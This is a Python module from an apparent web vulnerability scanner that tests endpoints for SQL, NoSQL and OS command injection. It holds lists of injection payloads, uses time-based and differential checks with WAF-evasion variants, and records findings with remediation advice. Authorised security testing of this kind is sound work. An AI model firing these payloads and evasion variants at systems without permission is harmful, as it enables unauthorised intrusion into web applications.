"""
OWASP A03: Injection — SQLi, NoSQLi, Command Injection, LDAP injection,
SSTI (delegated to advanced_ssti), XPath.
Each candidate is verified via differential / time-based oracles.
"""
from __future__ import annotations
import asyncio, re
from typing import List
from core.engine import Finding
from core.encoder import Encoder

SQLI_BOOLEAN_PAYLOADS = [
    ("' OR '1'='1' -- -", "' AND '1'='2' -- -", "GHTRUE_MARKER"),
    ("\" OR \"1\"=\"1\" -- -", "\" AND \"1\"=\"2\" -- -", "GHTRUE_MARKER"),
    ("1 OR 1=1# ", "1 AND 1=2# ", "GHTRUE_MARKER"),
    ("admin'--", "xxxx'--", "GHTRUE_MARKER"),
]
SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(5)-- -",         # MySQL
    "' AND pg_sleep(5)-- -",      # PostgreSQL
    "'; WAITFOR DELAY '0:0:5'-- ",# MSSQL
    "' OR SLEEP(5)#",             # MySQL alt
]
NOSQLI_PAYLOADS = [
    "' || 1==1 //", "1' || '1'=='1", "{\"$ne\": null}", "{\"$gt\": \"\"}",
]
CMDI_PAYLOADS = [
    "; sleep 5", "| sleep 5", "& sleep 5",
    "$(sleep 5)", "`sleep 5`", "; sleep 5 #",
]
LDAPI_PAYLOADS = [
    "*)(uid=*))(|(uid=*", "admin)(&", "*)(uid=*)",
]

async def run(http, waf, verifier, endpoints, targets, stack, findings_sink):
    findings: List[Finding] = []
    sem = asyncio.Semaphore(15)

    async def _sqli(ep):
        async with sem:
            for base_p, neg_p, _ in SQLI_BOOLEAN_PAYLOADS:
                for param in ep.get("params", [{"name": "id"}]):
                    name = param["name"]
                    base_url = _inject(ep["url"], name, base_p)
                    neg_url = _inject(ep["url"], name, neg_p)
                    benign_url = _inject(ep["url"], name, "GHVAL_123")

                    conf = await verifier.differential(
                        baseline_req=lambda: http.arequest("GET", benign_url),
                        payload_req=lambda: http.arequest("GET", base_url),
                        marker=None, control_marker=None,
                    )
                    if conf < 0.5:
                        # check if responses differ between true/false
                        rT = await http.arequest("GET", base_url)
                        rF = await http.arequest("GET", neg_url)
                        if rT and rF and abs(len(rT.text)-len(rF.text)) > 200:
                            conf = 0.85
                    if verifier.gate(conf):
                        findings.append(Finding(
                            title=f"SQL Injection (boolean-based) in {name}",
                            severity="critical", confidence=conf,
                            category="OWASP-A03", endpoint=ep["url"], method="GET",
                            payload=base_p,
                            evidence=f"Differential response confirmed. True payload len="
                                     f"{(rT.text if rT else '').__len__()} vs False="
                                     f"{(rF.text if rF else '').__len__()}",
                            cwe="CWE-89",
                            remediation="Use parameterized queries / prepared statements; "
                                        "validate and sanitize all inputs.",
                            tags=["sqli", "high-value"]
                        ))
                        return

            # Time-based
            for payload in SQLI_TIME_PAYLOADS:
                for variant in waf.evade(payload):
                    for param in ep.get("params", [{"name": "id"}]):
                        name = param["name"]
                        benign_url = _inject(ep["url"], name, "1")
                        payload_url = _inject(ep["url"], name, variant)
                        conf = await verifier.time_based(
                            benign_req=lambda: http.arequest("GET", benign_url),
                            payload_req=lambda: http.arequest("GET", payload_url),
                            expected_delay=5.0, rounds=2,
                        )
                        if verifier.gate(conf):
                            findings.append(Finding(
                                title=f"SQL Injection (time-based) in {name}",
                                severity="critical", confidence=conf,
                                category="OWASP-A03", endpoint=ep["url"], method="GET",
                                payload=variant, evidence="Time oracle confirmed (≥5s)",
                                cwe="CWE-89",
                                remediation="Parameterized queries; input allow-listing.",
                                tags=["sqli", "time-based", "high-value"]
                            ))
                            return

    async def _cmdi(ep):
        async with sem:
            for payload in CMDI_PAYLOADS:
                for variant in waf.evade(payload):
                    for param in ep.get("params", [{"name": "cmd"}]):
                        name = param["name"]
                        benign_url = _inject(ep["url"], name, "1")
                        payload_url = _inject(ep["url"], name, variant)
                        conf = await verifier.time_based(
                            benign_req=lambda: http.arequest("GET", benign_url),
                            payload_req=lambda: http.arequest("GET", payload_url),
                            expected_delay=5.0, rounds=2,
                        )
                        if verifier.gate(conf):
                            findings.append(Finding(
                                title=f"OS Command Injection in {name}",
                                severity="critical", confidence=conf,
                                category="OWASP-A03", endpoint=ep["url"], method="GET",
                                payload=variant, evidence="Time-based oracle confirmed",
                                cwe="CWE-78",
                                remediation="Avoid shell calls; use safe APIs; strict input validation.",
                                tags=["cmdi", "high-value", "rce"]
                            ))
                            return

    async def _nosqli(ep):
        async with sem:
            for payload in NOSQLI_PAYLOADS:
                for variant in waf.evade(payload):
                    for param in ep.get("params", [{"name": "user"}]):
                        name = param["name"]
                        benign_url = _inject(ep["url"], name, "GHVAL")
                        payload_url = _inject(ep["url"], name, variant)
                        rB = await http.arequest("GET", benign_url)
                        rP = await http.arequest("GET", payload_url)
                        if rB and rP and rP.status_code == 200 and rB.status_code != 200:
                            findings.append(Finding(
                                title=f"NoSQL Injection in {name}",
                                severity="high", confidence=0.85,
                                category="OWASP-A03", endpoint=ep["url"], method="GET",
                                payload=variant, evidence=f"Status changed {rB.status_code}->{rP.status_code}",
                                cwe="CWE-943",
                                remediation="Sanitize input; use safe query builders; type-check params.",
                                tags=["nosqli"]
                            ))
                            return

    tasks = []
    for ep in endpoints:
        tasks.append(_sqli(ep)); tasks.append(_cmdi(ep)); tasks.append(_nosqli(ep))
    await asyncio.gather(*tasks, return_exceptions=True)
    return findings

def _inject(url: str, param: str, value: str) -> str:
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    u = urlparse(url)
    qs = dict(parse_qsl(u.query))
    qs[param] = value
    return urlunparse(u._replace(query=urlencode(qs)))
